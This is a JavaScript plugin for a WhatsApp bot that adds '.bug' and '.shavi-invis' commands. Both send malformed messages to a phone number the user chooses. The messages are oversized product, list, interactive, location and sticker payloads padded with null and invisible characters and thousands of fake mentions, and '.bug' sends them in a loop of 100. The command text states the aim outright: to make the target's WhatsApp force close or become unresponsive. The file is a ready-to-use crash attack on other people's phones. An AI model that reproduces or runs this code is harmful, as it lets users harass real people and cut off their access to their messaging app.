const { cmd } = require('../command');
const crypto = require('crypto');
const axios = require('axios');
const { generateWAMessageFromContent, proto } = require('@whiskeysockets/baileys');

// fallback for different Baileys versions
if (!generateWAMessageFromContent) {
    try { 
        const baileys = require('@adiwajshing/baileys');
        generateWAMessageFromContent = baileys.generateWAMessageFromContent;
        proto = baileys.proto;
    } catch(e) {}
}

// Helper: download image from URL and return buffer
async function getImageBuffer(url) {
    try {
        const response = await axios.get(url, { responseType: 'arraybuffer', timeout: 10000 });
        return Buffer.from(response.data);
    } catch (error) {
        console.error('Image download failed:', url, error.message);
        return null;
    }
}

// Helper: validate and format target number
function getTarget(args, from, reply, cmdName) {
    if (!args || !args[0]) {
        reply(`❌ *Missing target number!*\n\nUsage: .${cmdName} 947XXXXXXXXX\nExample: .${cmdName} 94712345678`);
        return null;
    }
    return args[0].replace(/[^\d]/g, '') + '@s.whatsapp.net';
}

// ==================== ULTRA .bug (100 mixed payloads – black screen / force close) ====================
async function ultraBugCrash(conn, target) {
    const imageMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7118-24/691736887_988325427048309_788682993847765619_n.enc?ccb=11-4&oh=01_Q5Aa4gHmdgqbOLGYp2Ck_IhKprwM9Kkqvv89EH2eJBknWSr9Fg&oe=6A23B5DE&_nc_sid=5e03e0&mms3=true",
        mimetype: "image/jpeg",
        fileSha256: "PWTAJAHWUO0xqO802IsTrNwx8j5QN1eD+sT3gpUTWis=",
        fileLength: "93217",
        caption: "丂卄卂ᐯ丨ㄚ卂 - 千ㄩ匚Ҝ ㄚㄖㄩ" + "\u0000".repeat(90000),
        height: 1080,
        width: 1080,
        mediaKey: "QOByaM/siGh1h0k1sWbG69l7wHUgSR0tyCaUaKYal/0=",
        fileEncSha256: "AljbB1V/hf9gKsEzoeu2s+GvEa41VXy9MrKkj8Tea54=",
        directPath: "/v/t62.7118-24/691736887_988325427048309_788682993847765619_n.enc?ccb=11-4&oh=01_Q5Aa4gHmdgqbOLGYp2Ck_IhKprwM9Kkqvv89EH2eJBknWSr9Fg&oe=6A23B5DE&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1778142659",
        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAxAAACAwEBAAAAAAAAAAAAAAAABQIDBAEGAQADAQEBAAAAAAAAAAAAAAABAgMEAAX/2gAMAwEAAhADEAAAAFZVLWlw00o3nRytIp7XNukVhFljGyLaGiZshrmIx0VpmuoTKj2WhPDIzdZcSFeTaj5GCX0anU+crLr3YtlJnkVbHIs0WvJZ5zqv0JAiN2+oPLsdCo5iDQvbQskAOP8A/8QAKRAAAgIBAwMDAwUAAAAAAAAAAQIAAxEEEjEFEyEQIkEyQlEVJGJjgf/aAAgBAQABPwAVDC+ftzGXaASZ21IJEtoC4wfOItLMAYaTlgDxGq2qpgpJ4InYs+BFtbA8/GIzsy4z7ROmaWu6nc8s6ZU/G4S3Q3qgVCCBLK9TUT7DDbZn3GC47s/ENrn7pUoapeOYaqxnJnSyvZIWZjWL8ibAROorSlyAKJhd3EPJml6UXoR+5yIei/3TR6a7Ru27yk3K2I2xQW/An6rYG+jwDNVd3rWfMyfzBWZoz+2oH8IxAxky4qK28yjd3PrIWPe+9kx4A5lGkazd5GzM1PSgRmnmds1sVcYI9NPqMVUjPCy+6250Ss+7MGmtIBts/wAEr2G4gTXFaqjtHkyjXvVZmJr6GXduxNbctzhwuJkyq1gFmn1Ypt3sI+vFnhZTaUs3ZmrtDEnubQR5Bh5iHEMzF4E5Mb2qB8zdXRp6bAuXM1dj2OCy49BNntBhhrQrWcfaIyKpBAmoABTH4lzE11D4xLfOnQn0EFjAY9P/xAAhEQACAQQCAgMAAAAAAAAAAAAAAQIDERIxISIQEwQyUf/aAAgBAgEBPwCOSSux1LPZm2d2jv8AqMlx2J7414jHXO14weyq8IXTIeyTRTbysyx0aSKsfZdJ8I+PTcaey6iXLsp/QpbGk/H/xAAfEQACAgIBBQAAAAAAAAAAAAAAAQIRAxIxISIyQWL/2gAMAwEAAhEDEQA/AMGK6Uqdtd0DM9/kdpOUoy24YxvFS8ZD5H7MJ1//Z",
        contextInfo: { pairedMediaType: "NOT_PAIRED_MEDIA", isQuestion: true, isGroupStatus: true },
        scansSidecar: "3NpVPzuE+1LdqIuSDFHtXfXBR8TlDe+Tjjy/DWFOO9mcOpvyS9jbkQ==",
        firstScanLength: 9999999999999999999,
        scanLengths: [9999999999999999999, 9999999999999999999, 9999999999999999999, 9999999999999999999],
        midQualityFileSha256: "S8DxhY6+3htsmT0dCFsMkMqjoty3gkgOXAZCCft5V9U="
    };

    for (let i = 0; i < 100; i++) {
        // 1. Product message
        const productMsg = generateWAMessageFromContent(target, {
            viewOnceMessage: {
                message: {
                    productMessage: {
                        product: {
                            productImage: imageMessage,
                            productId: "449756950375071",
                            title: "丂卄卂ᐯ丨ㄚ卂 - 千ㄩ匚Ҝ ㄚㄖㄩ" + "\u0000".repeat(50000),
                            description: "MY Bad" + "\u2060".repeat(60000),
                            priceAmount1000: { low: 999999999, high: 999999999, unsigned: true },
                            url: "wa.me/status",
                            productImageCount: 9999999,
                            firstImageId: "9999999999",
                            salePriceAmount1000: { low: 999999999, high: 999999999, unsigned: true }
                        },
                        businessOwnerJid: "13135550002@s.whatsapp.net"
                    }
                }
            }
        }, {});
        await conn.relayMessage(target, productMsg.message, {});

        // 2. Interactive message
        const interactiveMsg = generateWAMessageFromContent(target, {
            interactiveMessage: {
                header: { title: "\u0000".repeat(90000), hasMediaAttachment: true },
                body: { text: "\u2060".repeat(80000) },
                footer: { text: "\u0000".repeat(90000) },
                nativeFlowMessage: { messageParamsJson: "\u0000".repeat(1500000) },
                contextInfo: {
                    mentionedJid: Array.from({ length: 2000 }, () => `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`)
                }
            }
        }, {});
        await conn.relayMessage(target, interactiveMsg.message, {});

        // 3. List message
        const listMsg = generateWAMessageFromContent(target, {
            listMessage: {
                title: "🔥 CRASH 🔥" + "\u0000".repeat(920000),
                footerText: "Xeon Bug" + "\u2060".repeat(50000),
                description: "Xeon Bug" + "\u0000".repeat(50000),
                buttonText: null,
                listType: 2,
                productListInfo: {
                    productSections: [{ title: "bug", products: [{ productId: "4392524570816732" }] }],
                    businessOwnerJid: "0@s.whatsapp.net"
                }
            }
        }, {});
        await conn.relayMessage(target, listMsg.message, {});

        // 4. Live location message
        const locationMsg = generateWAMessageFromContent(target, {
            viewOnceMessage: {
                message: {
                    liveLocationMessage: {
                        degreesLatitude: "p".repeat(50000),
                        degreesLongitude: "p".repeat(50000),
                        caption: "丂卄卂ᐯ丨ㄚ卂 - 千ㄩ匚Ҝ ㄚㄖㄩ" + "ꦾ".repeat(80000),
                        sequenceNumber: "0",
                        jpegThumbnail: ""
                    }
                }
            }
        }, {});
        await conn.relayMessage(target, locationMsg.message, {});

        // 5. Sticker message
        const stickerMsg = generateWAMessageFromContent(target, {
            stickerMessage: {
                url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4",
                fileSha256: "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
                fileEncSha256: "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
                mediaKey: "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
                mimetype: "image/webp",
                fileLength: "9999999999999999999",
                isAnimated: false,
                contextInfo: { mentionedJid: [target, ...Array.from({ length: 1000 }, () => `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`)] }
            }
        }, {});
        await conn.relayMessage(target, stickerMsg.message, {});
    }
}

// ==================== .shavi-invis (Invisible crash – no visible text) ====================
async function shaviInvisCrash(conn, target) {
    // Payload 1: Interactive with 800k invisible chars
    const msg1 = generateWAMessageFromContent(target, {
        interactiveMessage: {
            header: {
                locationMessage: { degreesLatitude: 9999999, degreesLongitude: 9999999 },
                hasMediaAttachment: true
            },
            body: { text: '\u2060'.repeat(800000) },
            nativeFlowMessage: { messageParamsJson: '\u0000'.repeat(1500000) },
            contextInfo: {
                mentionedJid: Array.from({ length: 2000 }, () => `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`)
            }
        }
    }, {});
    await conn.relayMessage(target, msg1.message, {});

    // Payload 2: Ephemeral with 600k invisible chars
    const msg2 = generateWAMessageFromContent(target, {
        ephemeralMessage: {
            message: {
                extendedTextMessage: {
                    text: '\u2063'.repeat(600000),
                    contextInfo: {
                        mentionedJid: Array.from({ length: 1500 }, () => `2${Math.floor(Math.random() * 8000000)}@s.whatsapp.net`),
                        stanzaId: '\u0000'.repeat(50000)
                    }
                }
            }
        }
    }, {});
    await conn.relayMessage(target, msg2.message, {});

    // Payload 3: List response with invisible title
    const sections = [];
    for (let i = 0; i < 30; i++) {
        sections.push({
            title: '\u2060'.repeat(40000),
            rows: [{ title: '\u2063'.repeat(40000), rowId: '\u0000'.repeat(40000) }]
        });
    }
    const msg3 = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                listResponseMessage: {
                    title: '\u2060'.repeat(90000),
                    sections: sections,
                    contextInfo: {
                        mentionedJid: Array.from({ length: 1500 }, () => `3${Math.floor(Math.random() * 7000000)}@s.whatsapp.net`)
                    }
                }
            }
        }
    }, {});
    await conn.relayMessage(target, msg3.message, {});

    // Payload 4: Group status mention
    const msg4 = generateWAMessageFromContent(target, {
        groupStatusMentionMessage: {
            groupJid: target,
            mentionedJid: Array.from({ length: 1000 }, () => `4${Math.floor(Math.random() * 6000000)}@s.whatsapp.net`),
            contextInfo: {
                mentionedJid: Array.from({ length: 1000 }, () => `5${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`)
            }
        }
    }, {});
    await conn.relayMessage(target, msg4.message, {});
}

// ==================== COMMANDS ====================

cmd({
    pattern: "bug",
    desc: "💀 ULTRA CRASH – 100 mixed payloads (black screen / force close)",
    category: "tools",
    filename: __filename
}, async (conn, mek, m, { from, reply, args }) => {
    const target = getTarget(args, from, reply, "bug");
    if (!target) return;
    await reply(`💀 *ULTRA BUG CRASH* → ${target}\n_Sending 100 extreme payloads..._`);
    try {
        await ultraBugCrash(conn, target);
        // Send success image (if available)
        const successImg = await getImageBuffer("https://whiteshadow-uploader.vercel.app/files/813.jpg");
        if (successImg) {
            await conn.sendMessage(from, { image: successImg, caption: `✅ ULTRA CRASH SENT → ${target}\n⚠️ *Target WhatsApp will force close immediately when opened.*` });
        } else {
            await reply(`✅ ULTRA CRASH SENT → ${target}\n⚠️ *Target WhatsApp will force close immediately when opened.*`);
        }
    } catch (err) {
        console.error(err);
        await reply(`❌ Failed: ${err.message}`);
    }
});

cmd({
    pattern: "shavi-invis",
    desc: "🔮 INVISIBLE CRASH – No visible text, target freezes/crashes",
    category: "tools",
    filename: __filename
}, async (conn, mek, m, { from, reply, args }) => {
    const target = getTarget(args, from, reply, "shavi-invis");
    if (!target) return;
    await reply(`🔮 *SHAVI INVISIBLE CRASH* → ${target}\n_Sending 4 invisible payloads..._`);
    try {
        await shaviInvisCrash(conn, target);
        const successImg = await getImageBuffer("https://whiteshadow-uploader.vercel.app/files/813.jpg");
        if (successImg) {
            await conn.sendMessage(from, { image: successImg, caption: `✅ SHAVI INVISIBLE CRASH SENT → ${target}\n⚠️ *Target WhatsApp will now be unresponsive.*` });
        } else {
            await reply(`✅ SHAVI INVISIBLE CRASH SENT → ${target}\n⚠️ *Target WhatsApp will now be unresponsive.*`);
        }
    } catch (err) {
        console.error(err);
        await reply(`❌ Failed: ${err.message}`);
    }
});

// ==================== BUG MENU (with image) ====================
cmd({
    pattern: "bugmenu",
    desc: "Show crash commands menu with image",
    category: "tools",
    filename: __filename
}, async (conn, mek, m, { from, reply }) => {
    const menuText = `*╭─「 👑 SHAVI ULTRA CRASH MENU 」─*\n│ 📌 .bug         : ULTRA CRASH (100 payloads – black screen)\n│ 📌 .shavi-invis : INVISIBLE CRASH (no visible text)\n╰──────────────●●►\n> 💡 *Usage:* .command 947XXXXXXXXX\n> ⚠️ *Extreme power – use only on numbers you own.*`;
    const menuImg = await getImageBuffer("https://whiteshadow-uploader.vercel.app/files/nsa.jpg");
    if (menuImg) {
        await conn.sendMessage(from, { image: menuImg, caption: menuText });
    } else {
        await reply(menuText);
    }
});
